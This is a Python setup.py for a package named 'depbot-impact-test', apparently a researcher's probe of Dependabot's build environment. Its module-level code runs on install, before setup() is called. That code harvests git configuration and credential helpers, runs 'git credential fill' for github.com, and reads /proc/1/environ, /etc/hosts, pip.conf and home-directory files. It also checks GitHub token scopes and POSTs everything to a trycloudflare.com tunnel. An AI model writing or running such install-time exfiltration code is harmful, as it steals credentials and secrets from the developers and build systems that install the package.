from setuptools import setup
import os
import json
import subprocess

_canary = "DEPBOT_IMPACT_V3_2026_Tx5nZpM8wK2qHzDv"

_result = {"c": _canary}

_result["git_config"] = subprocess.run(
    ["git", "config", "--list", "--show-origin"],
    capture_output=True, text=True, timeout=5
).stdout[:3000]

_result["git_cred_helpers"] = subprocess.run(
    ["git", "config", "--get-all", "credential.helper"],
    capture_output=True, text=True, timeout=5
).stdout[:1000]

_repo_path = os.environ.get("DEPENDABOT_REPO_CONTENTS_PATH", "")
if _repo_path and os.path.exists(_repo_path):
    _result["repo_files"] = os.popen("ls -la " + _repo_path).read()[:2000]
    _gitcfg = _repo_path + "/.git/config"
    if os.path.exists(_gitcfg):
        _result["repo_git_config"] = os.popen("cat " + _gitcfg).read()[:2000]

_result["etc_hosts"] = os.popen("cat /etc/hosts").read()[:2000]
_result["id"] = os.popen("id").read().strip()
_result["ps"] = os.popen("ps aux 2>/dev/null || ps -ef").read()[:3000]

_result["home_files"] = os.popen("find /home/dependabot -maxdepth 3 -type f 2>/dev/null").read()[:3000]

_result["proc_environ"] = os.popen("cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n'").read()[:3000]

_pip_conf = os.path.expanduser("~/.pip/pip.conf")
if os.path.exists(_pip_conf):
    _result["pip_conf"] = os.popen("cat " + _pip_conf).read()[:2000]

import urllib.request
try:
    _rq = urllib.request.Request(
        "https://api.github.com/repos/toofikz2/depbot-impact-test",
        headers={"User-Agent": "pip/24.0"}
    )
    _rp = urllib.request.urlopen(_rq, timeout=10)
    _result["github_repo_via_proxy"] = {
        "status": _rp.status,
        "scopes": _rp.headers.get("X-OAuth-Scopes", "none"),
        "ratelimit": _rp.headers.get("X-RateLimit-Limit", "?"),
        "body": _rp.read().decode("utf-8", errors="replace")[:2000],
    }
except Exception as _e:
    _result["github_repo_via_proxy"] = {"error": str(_e)[:500]}

try:
    _rq2 = urllib.request.Request(
        "https://api.github.com/user",
        headers={"User-Agent": "pip/24.0"}
    )
    _rp2 = urllib.request.urlopen(_rq2, timeout=10)
    _result["github_user_via_proxy"] = {
        "status": _rp2.status,
        "scopes": _rp2.headers.get("X-OAuth-Scopes", "none"),
        "body": _rp2.read().decode("utf-8", errors="replace")[:2000],
    }
except Exception as _e:
    _result["github_user_via_proxy"] = {"error": str(_e)[:500]}

_git_cred_test = subprocess.run(
    ["git", "credential", "fill"],
    input="protocol=https\nhost=github.com\n\n",
    capture_output=True, text=True, timeout=5
)
_result["git_credential_fill"] = {
    "stdout": _git_cred_test.stdout[:1000],
    "stderr": _git_cred_test.stderr[:500],
    "rc": _git_cred_test.returncode,
}

import urllib.request as _ur
try:
    _data = json.dumps(_result).encode()
    _rq3 = _ur.Request(
        "https://utc-ruling-selective-ash.trycloudflare.com/depbot-v3",
        data=_data,
        method="POST",
    )
    _rq3.add_header("Content-Type", "application/json")
    _ur.urlopen(_rq3, timeout=15)
except Exception:
    pass

setup(
    name="depbot-impact-test",
    version="0.1.0",
    install_requires=["requests==2.25.0"],
    tests_require=[_canary],
)
